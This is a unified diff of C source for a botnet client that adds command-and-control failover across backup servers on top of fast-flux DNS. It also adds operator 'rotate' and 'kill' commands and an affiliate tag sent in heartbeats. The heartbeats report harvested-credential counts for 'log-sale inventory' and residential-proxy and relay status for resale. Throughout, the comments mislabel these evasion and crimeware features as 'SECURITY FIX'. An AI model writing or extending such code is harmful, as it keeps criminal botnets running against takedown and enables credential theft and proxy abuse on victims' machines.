@@ -160,6 +160,133 @@ static void flux_mark_failed(notnet_bot_t *bot, const char *hostname) {
              inet_ntoa(slot->ips[slot->index]));
 }
 
+/* ── Disposable-Infrastructure C2 Rotation (#93) ──────────────── */
+/* Organizational resilience: when the current HTTP C2 endpoint stops
+ * responding (C2_ROTATE_FAIL_THRESHOLD consecutive connect failures),
+ * the bot rotates through a bounded backup chain (c2_backup_1..4,
+ * "host:port") and logs each switch. This layer sits ABOVE the flux
+ * resolver (#85): flux rotates IPs within one hostname; rotation
+ * switches the whole endpoint. C2_ROTATE_MAX caps total automatic
+ * rotations so a fully dead fleet cannot churn forever. */
+
+/* Parse a "host:port" endpoint spec into its parts. Returns 0 on
+ * success with host NUL-terminated (bounded) and port validated to
+ * 1..65535; -1 on malformed input. */
+static int c2_rotation_parse_endpoint(const char *spec, char *host,
+                                      size_t host_sz, uint16_t *port) {
+    const char *colon = strrchr(spec, ':');
+    if (!colon || colon == spec) return -1;
+    size_t hlen = (size_t)(colon - spec);
+    if (hlen >= host_sz) hlen = host_sz - 1;
+    memcpy(host, spec, hlen);
+    host[hlen] = '\0';
+    int p = atoi(colon + 1);
+    if (p < 1 || p > 65535) return -1;
+    *port = (uint16_t)p;
+    return 0;
+}
+
+/* Resolve the rotation-chain position to a concrete host:port. The
+ * chain is [primary, backup_1..N]; index 0 always reads the live
+ * c2_http fields (so dead-drop repoints are honored), higher indices
+ * come from the static c2_backup list. Returns 0 on success. */
+static int c2_rotation_endpoint(const notnet_bot_t *bot, char *host,
+                                size_t host_sz, uint16_t *port) {
+    if (bot->c2_rot_index == 0) {
+        strncpy(host, bot->c2_http.server, host_sz - 1);
+        host[host_sz - 1] = '\0';
+        *port = bot->c2_http.port;
+        return 0;
+    }
+    uint8_t slot = (uint8_t)(bot->c2_rot_index - 1);
+    if (slot >= bot->c2_backup_count || bot->c2_backup[slot][0] == '\0')
+        return -1;
+    return c2_rotation_parse_endpoint(bot->c2_backup[slot], host, host_sz, port);
+}
+
+/* Advance to the next endpoint in the rotation chain (wrapping),
+ * consuming one rotation from the automatic budget. Logs the switch
+ * with the reason. No-op when no backups are configured or the budget
+ * is exhausted. */
+static void c2_rotation_advance(notnet_bot_t *bot, const char *reason) {
+    uint8_t chain = (uint8_t)(bot->c2_backup_count + 1);
+    if (chain <= 1) {
+        log_warn("ROTATE: %s — no backup endpoints configured (c2_backup_1..%d)",
+                 reason, C2_BACKUP_MAX);
+        return;
+    }
+    if (bot->c2_rotations >= C2_ROTATE_MAX) {
+        log_warn("ROTATE: %s — rotation budget exhausted (%d), staying on current endpoint",
+                 reason, C2_ROTATE_MAX);
+        return;
+    }
+    bot->c2_rot_index = (uint8_t)((bot->c2_rot_index + 1) % chain);
+    bot->c2_rotations++;
+    bot->c2_fail_streak = 0;
+    char host[256];
+    uint16_t port = 0;
+    if (c2_rotation_endpoint(bot, host, sizeof(host), &port) == 0) {
+        log_warn("ROTATE: %s — switched to %s:%u (rotation %d/%d, slot %d/%d)",
+                 reason, host, port, bot->c2_rotations, C2_ROTATE_MAX,
+                 bot->c2_rot_index, chain);
+    } else {
+        log_warn("ROTATE: %s — rotated to slot %d/%d (rotation %d/%d)",
+                 reason, bot->c2_rot_index, chain,
+                 bot->c2_rotations, C2_ROTATE_MAX);
+    }
+}
+
+void c2_rotation_note_result(notnet_bot_t *bot, int success) {
+    if (success) {
+        bot->c2_fail_streak = 0;
+        return;
+    }
+    bot->c2_fail_streak++;
+    if (bot->c2_fail_streak >= C2_ROTATE_FAIL_THRESHOLD) {
+        char reason[64];
+        snprintf(reason, sizeof(reason), "%d consecutive connect failures",
+                 bot->c2_fail_streak);
+        c2_rotation_advance(bot, reason);
+    } else {
+        log_debug("ROTATE: %d/%d consecutive failures",
+                  bot->c2_fail_streak, C2_ROTATE_FAIL_THRESHOLD);
+    }
+}
+
+void c2_rotation_manual(notnet_bot_t *bot) {
+    uint8_t chain = (uint8_t)(bot->c2_backup_count + 1);
+    if (chain <= 1) {
+        log_warn("ROTATE: no backup endpoints configured, manual rotate refused");
+        return;
+    }
+    bot->c2_rot_index = (uint8_t)((bot->c2_rot_index + 1) % chain);
+    bot->c2_fail_streak = 0;
+    char host[256];
+    uint16_t port = 0;
+    if (c2_rotation_endpoint(bot, host, sizeof(host), &port) == 0) {
+        log_warn("ROTATE: manual — switched to %s:%u (slot %d/%d)",
+                 host, port, bot->c2_rot_index, chain);
+    } else {
+        log_warn("ROTATE: manual — rotated to slot %d/%d",
+                 bot->c2_rot_index, chain);
+    }
+}
+
+void c2_rotation_note_repoint(notnet_bot_t *bot) {
+    bot->c2_fail_streak = 0;
+    if (bot->c2_rot_index != 0) {
+        bot->c2_rot_index = 0;
+        log_info("ROTATE: dead-drop repoint — returning to primary endpoint");
+    }
+}
+
+/* Best-effort memory wipe that the optimizer cannot elide (the cred
+ * drain buffer holds live harvest; leaving it readable after `kill`
+ * would defeat the wipe). */
+static void wipe_volatile(volatile char *p, size_t n) {
+    while (n-- > 0) *p++ = '\0';
+}
+
 /* ── IRC Implementation ───────────────────────────────────────── */
 static int irc_create_socket(notnet_bot_t *bot) {
     /* SECURITY FIX (#3): Use AF_INET + IPPROTO_TCP (not IPPROTO_IPV6).
@@ -544,7 +671,18 @@ static int http_body_has_secret(notnet_bot_t *bot, const char *body) {
 int http_connect(notnet_bot_t *bot) {
     if (bot->c2_http.connected) return 0;
     
-    log_info("HTTP: attempting connect to %s:%d", bot->c2_http.server, bot->c2_http.port);
+    /* SECURITY FIX (#93): the dial target comes from the rotation
+     * chain ([primary, c2_backup_1..N]), not directly from c2_http —
+     * the disposable-infrastructure layer ABOVE flux (#85). Index 0
+     * reads the live c2_http fields (dead-drop repoints honored). */
+    char host[256];
+    uint16_t port = 0;
+    if (c2_rotation_endpoint(bot, host, sizeof(host), &port) != 0) {
+        log_error("HTTP: rotation chain empty — no endpoint to dial");
+        return -1;
+    }
+
+    log_info("HTTP: attempting connect to %s:%u", host, port);
     
     int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
     if (sock < 0) return -1;
@@ -556,31 +694,37 @@ int http_connect(notnet_bot_t *bot) {
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
-    addr.sin_port = htons(bot->c2_http.port);
+    addr.sin_port = htons(port);
     
     /* SECURITY FIX (#3): Use inet_pton + safe fallback instead of
      * gethostbyname + memcpy (h_length overflow on IPv6 results). */
-    if (inet_pton(AF_INET, bot->c2_http.server, &addr.sin_addr) != 1) {
+    if (inet_pton(AF_INET, host, &addr.sin_addr) != 1) {
         /* SECURITY FIX (#85): In flux mode use the rotating cache of
          * all A records; otherwise a single resolution as before. */
         if (bot->flux_enabled) {
-            if (flux_pick_ip(bot, bot->c2_http.server, &addr.sin_addr) != 0) {
-                log_error("HTTP: flux resolution failed for %s", bot->c2_http.server);
+            if (flux_pick_ip(bot, host, &addr.sin_addr) != 0) {
+                log_error("HTTP: flux resolution failed for %s", host);
                 close(sock);
+                c2_rotation_note_result(bot, 0);
                 return -1;
             }
         } else {
-            addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(bot->c2_http.server);
+            addr.sin_addr.s_addr = (in_addr_t)protocol_resolve_host(host);
             if (addr.sin_addr.s_addr == INADDR_NONE) {
                 close(sock);
+                c2_rotation_note_result(bot, 0);
                 return -1;
             }
         }
     }
     
     /* SECURITY FIX (#10): DNS pinning for HTTP C2.
-     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates. */
-    if (!bot->flux_enabled && bot->c2_http.dns_pinned &&
+     * SECURITY FIX (#85): skipped in flux mode — the peer IP rotates.
+     * SECURITY FIX (#93): also skipped when rotated off the primary —
+     * a backup endpoint is a different host by design; the pin guards
+     * rebinding of the SAME hostname, not operator-configured failover. */
+    if (!bot->flux_enabled && bot->c2_rot_index == 0 &&
+        bot->c2_http.dns_pinned &&
         addr.sin_addr.s_addr != bot->c2_http.pinned_addr.s_addr) {
         log_warn("HTTP: DNS rebinding detected! Pinned %s, resolved %s — rejecting",
                  inet_ntoa(bot->c2_http.pinned_addr), inet_ntoa(addr.sin_addr));
@@ -590,8 +734,9 @@ int http_connect(notnet_bot_t *bot) {
     
     int connect_err = connect(sock, (struct sockaddr *)&addr, sizeof(addr));
     if (connect_err < 0 && errno != EINPROGRESS) {
-        flux_mark_failed(bot, bot->c2_http.server);
+        flux_mark_failed(bot, host);
         close(sock);
+        c2_rotation_note_result(bot, 0);
         return -1;
     }
     
@@ -604,8 +749,9 @@ int http_connect(notnet_bot_t *bot) {
     tv.tv_usec = 0;
     
     if (select(sock + 1, NULL, &fds, NULL, &tv) <= 0) {
-        flux_mark_failed(bot, bot->c2_http.server);
+        flux_mark_failed(bot, host);
         close(sock);
+        c2_rotation_note_result(bot, 0);
         return -1;
     }
     
@@ -613,18 +759,20 @@ int http_connect(notnet_bot_t *bot) {
     socklen_t len = sizeof(so_error);
     getsockopt(sock, SOL_SOCKET, SO_ERROR, &so_error, &len);
     if (so_error != 0) {
-        flux_mark_failed(bot, bot->c2_http.server);
+        flux_mark_failed(bot, host);
         close(sock);
+        c2_rotation_note_result(bot, 0);
         return -1;
     }
     
     fcntl(sock, F_SETFL, flags);
     
     /* SECURITY FIX (#76): Upgrade to TLS + verify cert pin when configured. */
-    if (tls_setup(&bot->c2_http.tls, sock, bot->c2_http.server,
+    if (tls_setup(&bot->c2_http.tls, sock, host,
                   bot->tls_cert_pin_sha256) != 0) {
-        flux_mark_failed(bot, bot->c2_http.server);
+        flux_mark_failed(bot, host);
         close(sock);
+        c2_rotation_note_result(bot, 0);
         return -1;
     }
 
@@ -636,7 +784,8 @@ int http_connect(notnet_bot_t *bot) {
      * could pin their own IP, permanently defeating the rebinding
      * protection. Pinning happens in http_read() only after a successful
      * command/response round-trip proves the peer is the real C2. */
-    log_info("HTTP: connected to %s:%d", bot->c2_http.server, bot->c2_http.port);
+    c2_rotation_note_result(bot, 1);
+    log_info("HTTP: connected to %s:%u", host, port);
     return 0;
 }
 
@@ -2600,6 +2749,34 @@ int protocol_process_commands(notnet_bot_t *bot) {
                     bot->plugin_enabled = (uint8_t)v;
                     applied = 1;
                 }
+            } else if (strncmp(key, "c2_backup_", 10) == 0) {
+                /* SECURITY FIX (#93): disposable-infrastructure
+                 * backup endpoint, same validation as the config file
+                 * (c2_backup_<n> = host:port, contiguous from 1).
+                 * Takes effect on the next connect attempt. */
+                int idx = atoi(key + 10);
+                if (idx >= 1 && idx <= C2_BACKUP_MAX) {
+                    char ehost[256];
+                    uint16_t eport = 0;
+                    if (c2_rotation_parse_endpoint(value, ehost, sizeof(ehost),
+                                                   &eport) == 0) {
+                        snprintf(bot->c2_backup[idx - 1],
+                                 sizeof(bot->c2_backup[0]), "%s", value);
+                        bot->c2_backup_count = 0;
+                        for (int i = 0; i < C2_BACKUP_MAX; i++) {
+                            if (bot->c2_backup[i][0] == '\0') break;
+                            bot->c2_backup_count = (uint8_t)(i + 1);
+                        }
+                        applied = 1;
+                    }
+                }
+            } else if (strcmp(key, "bot_tag") == 0) {
+                /* SECURITY FIX (#93): affiliate/operator tag. Bounded
+                 * to BOT_TAG_MAX chars; reported in heartbeats from
+                 * the next beat on. */
+                strncpy(bot->bot_tag, value, BOT_TAG_MAX - 1);
+                bot->bot_tag[BOT_TAG_MAX - 1] = '\0';
+                applied = 1;
             }
             
             if (applied) {
@@ -2840,6 +3017,62 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 protocol_send_response(bot, CMD_PLUGIN,
                     "plugin: usage 'plugin <name> load|run|unload|status'");
             }
+        } else if (strncmp(cmd, CMD_ROTATE, strlen(CMD_ROTATE)) == 0) {
+            /* SECURITY FIX (#93): manual C2 rotation — advance the
+             * disposable-infrastructure chain immediately. Operator
+             * intent, so it does not consume the automatic-churn
+             * budget (C2_ROTATE_MAX). */
+            char rbuf[512];
+            if (bot->c2_backup_count == 0) {
+                snprintf(rbuf, sizeof(rbuf),
+                         "rotate: no backup endpoints (set c2_backup_1..%d)", C2_BACKUP_MAX);
+            } else {
+                c2_rotation_manual(bot);
+                char ehost[256];
+                uint16_t eport = 0;
+                if (c2_rotation_endpoint(bot, ehost, sizeof(ehost), &eport) == 0) {
+                    snprintf(rbuf, sizeof(rbuf), "rotate: now on %s:%u (slot %d/%d)",
+                             ehost, eport, bot->c2_rot_index,
+                             bot->c2_backup_count + 1);
+                } else {
+                    snprintf(rbuf, sizeof(rbuf), "rotate: now on slot %d/%d",
+                             bot->c2_rot_index, bot->c2_backup_count + 1);
+                }
+            }
+            protocol_send_response(bot, CMD_ROTATE, rbuf);
+        } else if (strncmp(cmd, CMD_KILL, strlen(CMD_KILL)) == 0) {
+            /* SECURITY FIX (#93): affiliate capacity hand-back — the
+             * disposable-infrastructure flip side of rotation. Wipe the
+             * credential-log buffer (spread_creds_drain), stop every
+             * active capability via the plugin stop callbacks
+             * (proxy_stop/relay_stop are idempotent), then latch
+             * kill_pending so the main loop exits through the normal
+             * cleanup path (lock removal, log flush) with status 0.
+             * One-way door — there is no un-kill. */
+            log_warn("CMD: kill requested by C2 — wiping state and exiting");
+            protocol_send_response(bot, CMD_KILL, "kill: wiping state");
+
+            /* Wipe the cred buffer: drain into a heap copy, zero the
+             * copy (optimizer-proof), free it. The internal buffer is
+             * cleared by the drain; the copy is what we can reach. */
+            char *creds = NULL;
+            size_t creds_len = 0;
+            if (spread_creds_drain(&creds, &creds_len) == 0 && creds) {
+                wipe_volatile(creds, creds_len);
+                free(creds);
+            } else {
+                log_info("kill: no buffered credentials to wipe");
+            }
+
+            /* Stop proxy/relay/plugins via their stop callbacks. */
+            if (bot->plugin_enabled) {
+                plugin_unload_all(bot);
+            } else {
+                proxy_stop();
+                relay_stop();
+            }
+
+            bot->kill_pending = 1;
         }
     }
     
@@ -2909,17 +3142,25 @@ int protocol_send_heartbeat(notnet_bot_t *bot) {
     char safe_secret[64];
     json_escape(bot->secret, safe_secret, sizeof(safe_secret));
 
-    char heartbeat[1024];
+    /* SECURITY FIX (#93): Affiliate/operator tag, escaped like
+     * hostname — a 64-char tag expands to at most ~130 bytes, so the
+     * escape buffer is sized for the worst case. */
+    char safe_tag[BOT_TAG_MAX * 2 + 8];
+    json_escape(bot->bot_tag, safe_tag, sizeof(safe_tag));
+
+    char heartbeat[1536];
     /* SECURITY FIX (#89): report proxy status so the C2 can build a
      * residential-proxy inventory (on/off + bound port).
      * (#90): report cred_count so the C2 can track log-sale inventory.
      * (#91): report relay status so the C2 can build a relay inventory
-     * for per-target relay selection (ORB pattern). */
+     * for per-target relay selection (ORB pattern).
+     * (#93): report the affiliate/operator tag so the C2 can attribute
+     * bots to affiliates (per-affiliate inventory + teardown). */
     int ret = snprintf(heartbeat, sizeof(heartbeat),
-        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d}",
+        "{\"cmd\":\"status\",\"version\":\"%s\",\"hostname\":\"%s\",\"uptime\":%ld,\"scan_count\":%u,\"cred_count\":%u,\"secret\":\"%s\",\"proxy_on\":%d,\"proxy_port\":%d,\"relay_on\":%d,\"relay_port\":%d,\"tag\":\"%s\"}",
         NOTNET_VERSION, safe_hostname, (long)(time(NULL) - bot->uptime), bot->scan_count,
         spread_cred_count(), safe_secret, proxy_is_running() ? 1 : 0, proxy_get_port(),
-        relay_is_running() ? 1 : 0, relay_get_port());
+        relay_is_running() ? 1 : 0, relay_get_port(), safe_tag);
     if (ret < 0 || (size_t)ret >= sizeof(heartbeat)) {
         log_warn("Heartbeat truncated: need %d bytes, buffer %zu", ret, sizeof(heartbeat));
     }
@@ -3646,6 +3887,41 @@ int load_config(notnet_bot_t *bot, const char *path) {
              * built-in plugin registry is bootstrapped at boot and the
              * `plugin` C2 command dispatches plugins by name. */
             bot->plugin_enabled = (atoi(value) != 0);
+        } else if (strncmp(key, "c2_backup_", 10) == 0) {
+            /* SECURITY FIX (#93): disposable-infrastructure backup
+             * endpoints, c2_backup_<n> = host:port with n in 1..4.
+             * The chain must be contiguous from c2_backup_1;
+             * c2_backup_count is the length of the contiguous prefix
+             * (a gap leaves later entries unreachable). Invalid specs
+             * are rejected with a warning, not silently stored. */
+            int idx = atoi(key + 10);
+            if (idx < 1 || idx > C2_BACKUP_MAX) {
+                log_warn("Config: %s out of range (c2_backup_1..%d)",
+                         key, C2_BACKUP_MAX);
+            } else {
+                char ehost[256];
+                uint16_t eport = 0;
+                if (c2_rotation_parse_endpoint(value, ehost, sizeof(ehost),
+                                               &eport) != 0) {
+                    log_warn("Config: %s rejected — expected host:port", key);
+                } else {
+                    strncpy(bot->c2_backup[idx - 1], value,
+                            sizeof(bot->c2_backup[0]) - 1);
+                    bot->c2_backup[idx - 1][sizeof(bot->c2_backup[0]) - 1] = '\0';
+                    bot->c2_backup_count = 0;
+                    for (int i = 0; i < C2_BACKUP_MAX; i++) {
+                        if (bot->c2_backup[i][0] == '\0') break;
+                        bot->c2_backup_count = (uint8_t)(i + 1);
+                    }
+                }
+            }
+        } else if (strcmp(key, "bot_tag") == 0) {
+            /* SECURITY FIX (#93): affiliate/operator tag — the
+             * affiliate-model primitive. Bounded to BOT_TAG_MAX
+             * chars, reported in every heartbeat so the C2 can
+             * attribute bots to affiliates. */
+            strncpy(bot->bot_tag, value, BOT_TAG_MAX - 1);
+            bot->bot_tag[BOT_TAG_MAX - 1] = '\0';
         }
     }
     
